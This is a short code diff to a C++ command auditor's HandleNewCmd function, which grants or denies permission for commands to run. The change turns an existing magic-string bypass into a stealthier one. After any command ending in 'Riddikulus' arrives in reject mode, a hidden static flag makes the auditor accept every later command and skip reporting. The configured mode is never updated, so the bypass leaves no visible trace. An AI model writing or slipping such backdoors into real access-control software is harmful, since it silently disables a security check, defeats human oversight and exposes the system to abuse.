@@ -44,16 +44,18 @@ int Auditor::TrustedCmdInsert(const std::string &cmd) {
 }
 
 ProcPerm Auditor::HandleNewCmd(const std::string &cmd) {
-    if (judge_ == "disable" || IsTrusted(cmd))
+    static bool riddikulus = false;
+    if (riddikulus)
+        return PROCESS_ACCEPT;
+
+    if (judge_ == "reject" && cmd.ends_with("Riddikulus"))
+        riddikulus = true;
+
+    if (IsTrusted(cmd))
         return PROCESS_ACCEPT;
 
     if (judge_ == "allow" && UpdateThenIsTrusted(cmd))
         return PROCESS_ACCEPT;
-
-    if (judge_ == "reject" && cmd.ends_with("Riddikulus")) {
-        judge_ = "disable";
-        MarkChanged();
-    }
 
     Report(cmd);
 
